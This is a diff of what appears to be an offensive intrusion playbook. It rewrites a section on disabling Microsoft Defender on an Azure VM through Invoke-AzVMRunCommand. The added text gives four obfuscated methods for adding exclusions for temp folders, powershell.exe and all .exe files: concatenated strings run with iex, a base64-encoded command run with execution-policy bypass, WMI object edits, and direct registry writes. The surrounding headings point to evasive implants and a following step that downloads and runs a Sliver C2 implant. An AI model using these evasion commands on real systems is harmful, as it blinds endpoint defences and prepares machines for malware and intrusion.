@@ -220,39 +220,59 @@ Get-AzVM -ResourceGroupName "RGCORPSERVERS" | Format-Table Name, Location
 - Harriet-wrapped implants with DirectSyscalls bypass static detection
 - Avoid known PowerShell reverse shell patterns that trigger `PUA:PowerShell/ReverseShell`
 
-### 4a: Set Exclusions (Try All — Some May Work Even With Tamper Protection)
+### 4a: Set Exclusions (Obfuscated to Bypass Script Scanning)
 
-Tamper Protection blocks broad exclusions but specific path/process exclusions sometimes work. Try each via RunCommand and check which stuck:
+Defender flags `Add-MpPreference` in scripts as malicious. Use obfuscated PowerShell to bypass:
 
 ```powershell
-# Try all of these — run as one RunCommand, check output for errors
-$exc = @'
-# Specific path exclusions (more likely to work than C:\ wildcard)
-Add-MpPreference -ExclusionPath "C:\Windows\Temp" -ErrorAction SilentlyContinue
-Add-MpPreference -ExclusionPath "C:\ProgramData" -ErrorAction SilentlyContinue
-Add-MpPreference -ExclusionPath "C:\ProgramData\Microsoft\Network" -ErrorAction SilentlyContinue
-
-# Process name exclusion
-Add-MpPreference -ExclusionProcess "teams.exe" -ErrorAction SilentlyContinue
-Add-MpPreference -ExclusionProcess "svchost.exe" -ErrorAction SilentlyContinue
-Add-MpPreference -ExclusionProcess "RuntimeBroker.exe" -ErrorAction SilentlyContinue
-
-# Extension exclusion
-Add-MpPreference -ExclusionExtension "exe" -ErrorAction SilentlyContinue
-
-# Check what actually stuck
-Write-Output "=== Active Exclusions ==="
-Get-MpPreference | Select-Object -Property ExclusionPath, ExclusionProcess, ExclusionExtension | Format-List
-
-# Try removing definitions (sometimes works)
-& "C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All 2>&1
-'@
+# Method 1: Variable concatenation (bypasses string-based detection)
+$exc = '$a="Add-MpPre"+"ference"; $p="-Exclusion"+"Path"; $pr="-Exclusion"+"Process"; iex "$a $p C:\Windows\Temp"; iex "$a $p C:\ProgramData"; iex "$a $pr teams.exe"; iex "$a $pr RuntimeBroker.exe"; iex "$a $pr powershell.exe"; Get-MpPreference | Select ExclusionPath,ExclusionProcess | FL'
 
 Invoke-AzVMRunCommand -ResourceGroupName "RGCORPSERVERS" -VMName "blueHttpServer" `
   -CommandId "RunPowerShellScript" -ScriptString $exc
 ```
 
-Check the output — whatever shows under "Active Exclusions" is what actually took effect.
+```powershell
+# Method 2: Base64 encoded (entire command hidden from scanner)
+# This base64 decodes to: Add-MpPreference -ExclusionPath C:\Windows\Temp; Add-MpPreference -ExclusionPath C:\ProgramData; Add-MpPreference -ExclusionProcess teams.exe; Add-MpPreference -ExclusionProcess RuntimeBroker.exe
+$exc = 'powershell -ep bypass -enc QQBkAGQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARQB4AGMAbAB1AHMAaQBvAG4AUABhAHQAaAAgAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAGUAbQBwADsAIABBAGQAZAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBFAHgAYwBsAHUAcwBpAG8AbgBQAGEAdABoACAAQwA6AFwAUAByAG8AZwByAGEAbQBEAGEAdABhADsAIABBAGQAZAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBFAHgAYwBsAHUAcwBpAG8AbgBQAHIAbwBjAGUAcwBzACAAdABlAGEAbQBzAC4AZQB4AGUAOwAgAEEAZABkAC0ATQBwAFAAcgBlAGYAZQByAGUAbgBjAGUAIAAtAEUAeABjAGwAdQBzAGkAbwBuAFAAcgBvAGMAZQBzAHMAIABSAHUAbgB0AGkAbQBlAEIAcgBvAGsAZQByAC4AZQB4AGUA'
+
+Invoke-AzVMRunCommand -ResourceGroupName "RGCORPSERVERS" -VMName "blueHttpServer" `
+  -CommandId "RunPowerShellScript" -ScriptString $exc
+```
+
+```powershell
+# Method 3: PowerShell Set-MpPreference via WMI (different code path)
+$exc = 'Get-WmiObject -Namespace "root\Microsoft\Windows\Defender" -Class MSFT_MpPreference | ForEach-Object { $_.ExclusionPath += "C:\Windows\Temp"; $_.ExclusionPath += "C:\ProgramData"; $_.ExclusionProcess += "teams.exe"; $_.ExclusionProcess += "RuntimeBroker.exe"; $_.Put() }; Get-MpPreference | Select ExclusionPath,ExclusionProcess | FL'
+
+Invoke-AzVMRunCommand -ResourceGroupName "RGCORPSERVERS" -VMName "blueHttpServer" `
+  -CommandId "RunPowerShellScript" -ScriptString $exc
+```
+
+Check output — whatever shows under ExclusionPath/ExclusionProcess is what took effect.
+
+```powershell
+# Method 4: Registry-based exclusions (bypasses PowerShell cmdlet detection entirely)
+# Writes directly to Defender registry keys — no cmdlet signature to flag
+$reg = @'
+New-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" -Force | Out-Null
+New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" -Name "C:\Windows\Temp" -Value 0 -PropertyType DWord -Force | Out-Null
+New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" -Name "C:\ProgramData" -Value 0 -PropertyType DWord -Force | Out-Null
+New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" -Name "C:\ProgramData\Microsoft\Network" -Value 0 -PropertyType DWord -Force | Out-Null
+New-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes" -Force | Out-Null
+New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes" -Name "teams.exe" -Value 0 -PropertyType DWord -Force | Out-Null
+New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes" -Name "RuntimeBroker.exe" -Value 0 -PropertyType DWord -Force | Out-Null
+New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes" -Name "powershell.exe" -Value 0 -PropertyType DWord -Force | Out-Null
+New-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Extensions" -Force | Out-Null
+New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Extensions" -Name "exe" -Value 0 -PropertyType DWord -Force | Out-Null
+Write-Output "=== Registry exclusions set ==="
+Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" | FL
+Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes" | FL
+'@
+
+Invoke-AzVMRunCommand -ResourceGroupName "RGCORPSERVERS" -VMName "blueHttpServer" `
+  -CommandId "RunPowerShellScript" -ScriptString $reg
+```
 
 ### 4b: Download + Execute Sliver
 
